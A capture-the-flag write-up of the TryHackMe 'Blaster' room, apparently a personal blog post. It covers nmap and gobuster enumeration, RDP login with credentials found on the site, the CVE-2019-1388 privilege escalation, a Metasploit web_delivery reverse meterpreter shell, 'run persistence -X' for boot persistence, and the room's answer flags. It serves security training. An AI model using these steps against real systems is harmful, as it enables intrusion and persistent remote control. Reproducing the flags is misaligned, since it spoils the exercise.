---
title: "Blaster - TryHackMe"
author: Ludovic COULON
date: 2020-05-12
hero: ./images/hero.png
excerpt: "Writeup for the Blaster challenge on TryHackMe"
---

[TryHackMe | Blaster](https://tryhackme.com/room/blaster)

Now that we've launched our target, let's perform some basic enumeration of the services running on it!

<div className="Image__Medium">
  <img src="https://i.imgur.com/tYPQMro.jpg" alt="blog_image" />
</div>

### Setup

```bash
nmap -sV -sV -vv 10.10.99.208
```

```bash
Discovered open port 80/tcp on 10.10.99.208
Discovered open port 3389/tcp on 10.10.99.208
```

### #1 How many ports are open on our target system?

```bash
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server

3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-05-12T19:39:05+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-11T19:35:42
| Not valid after:  2020-11-10T19:35:42
| MD5:   168d 6842 febb 8931 35b1 0ed4 70ff b1c0
| SHA-1: d7b5 f8c5 18d4 d074 c188 1a5b d68d eaa5 e545 ab66
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQeP9i1HUS/KhFwLqrMprZGTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMDA1MTExOTM1NDJaFw0yMDExMTAxOTM1
| NDJaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA3uplgsfRAD9kXv95tyheC2b+FJrRlMkFiVv2XnwKUtuSiU4iq6Dw
| QF7FlIlftt9YQLPlM18gOIzhIe3gzkLfB6ivrOu7bc7q8vQCS7bfL7unLUH4uKDM
| 1J9vzfZPLUQk8RDYK4567hpOK1TILOdRRAjdKX59WMKHMEb7Rxmy5pN3/IESaMxZ
| y25xFF3fUn15YeLBwv+t5lrZmSmklrkMm6Njv9XpYC0fiN65rD9IlgnysphjcpVX
| /HPPHMWt6dTQ7uIQOcQvH/WitJlKciEXwPl98lNgGXxo8YM8Ss92BtI+q0MNhNKY
| X0+Rz/1isiAyAMsRSdWOSdBPQvzF+C9PgwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAFWMuV0PR4nv
| sw+pQSs6f3qpeWlXOv2yvtaamWh3Lq5bxJq00IfnGOXNOOV2DTLA0EliM8GeFa0O
| OIbK0bJ/oHpCIuvQFFyDW3wOxwfsyrfmlYYFl6DpAKJMP02yuZGjM83U8kaYgx+n
| 6qm8x5W25JhqypnV8sbpVCU2Qz9HWIZKV6kDDFjs/ULNiusg7VvdnFQJ8a2hJCYX
| WfiIszEABT/908vc9ww6yiFtrHRZ1KG1QVtlG6ypQEYtFYu1PYXHOs+4kMgHIqSr
| uycvyhfEsP5ngm7n3S7+UXWapihnKthBzDX1nQ+5lsbqguL5HcEyN4rE4qq7Csu4
| yTyiy1t4Z7s=
|_-----END CERTIFICATE-----
|_ssl-date: 2020-05-12T19:39:06+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
2
```

### #2 Looks like there's a web server running, what is the title of the page we discover when browsing to it?

<div className="Image__Medium">
  <img src="https://imgur.com/6VAlMFo.png" alt="blog_image" />
</div>

```bash
IIS Windows Server
```

### #3 Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

```bash
➜  TryHackMe gobuster dir -u http://10.10.99.208/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.99.208/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/12 15:42:07 Starting gobuster
===============================================================
/retro (Status: 301)
```

### #4 Navigate to our discovered hidden directory, what potential username do we discover?

<div className="Image__Medium">
  <img src="https://imgur.com/2r9msWq.png" alt="blog_image" />
</div>

```bash
wade
```

### #5 Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

<div className="Image__Medium">
  <img src="https://imgur.com/F5W2pPn.png" alt="blog_image" />
</div>

```bash
parzival
```

### #6 Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

<div className="Image__Medium">
  <img src="https://imgur.com/0ZfcNA4.png" alt="blog_image" />
</div>

Username : wade

Password : parzival

<div className="Image__Medium">
  <img src="https://imgur.com/wCzDKwW.png" alt="blog_image" />
</div>

```bash
THM{HACK_PLAYER_ONE}
```

### Now that we've gained access to our target system, let's see if we can find a way to escalate. To start, let's scout around the system to see if we can find anything of interest.

<div className="Image__Medium">
  <img src="https://i.imgur.com/V9vvTIY.jpg" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/E8LViJj.png" alt="blog_image" />
</div>

### #1 When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

[CVE-2019-1388 HHUPD.exe - Nagenrauft Consulting](https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/)

```bash
CVE-2019-1388
```

### #2 Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

```bash
hhupd
```

### #3 Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

[https://www.youtube.com/watch?v=3BQKpPNlTSo](https://www.youtube.com/watch?v=3BQKpPNlTSo)

### #4 Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

<div className="Image__Medium">
  <img src="https://imgur.com/anGmtmS.png" alt="blog_image" />
</div>

```bash
NT AUTHORITY\SYSTEM
```

### #5 Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

<div className="Image__Small">
  <img src="https://imgur.com/IRNMP4n.png" alt="blog_image" />
</div>

```bash
THM{COIN_OPERATED_EXPLOITATION}
```

### Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.

<div className="Image__Medium">
  <img src="https://i.imgur.com/1LzGblJ.jpg" alt="blog_image" />
</div>

### #1 Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select

'exploit/multi/script/web_delivery' for use.

<div className="Image__Medium">
  <img src="https://imgur.com/a2c5dWx.png" alt="blog_image" />
</div>

### #2 First, let's set the target to PSH (PowerShell). Which target number is PSH?

```bash
msf5 exploit(multi/script/web_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   pubprn
   5   PSH (Binary)
   6   Linux
   7   Mac OS X
```

```bash
2
```

### #3 After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.

<div className="Image__Medium">
  <img src="https://imgur.com/aa4eaMs.png" alt="blog_image" />
</div>

### #4 Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload

windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.

```bash
Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.2.228       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

### #6 Last but certainly not least, let's look at persistence mechanisms via

Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot
startup.

[Meterpreter Service | Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)

```bash
run persistence -X
```
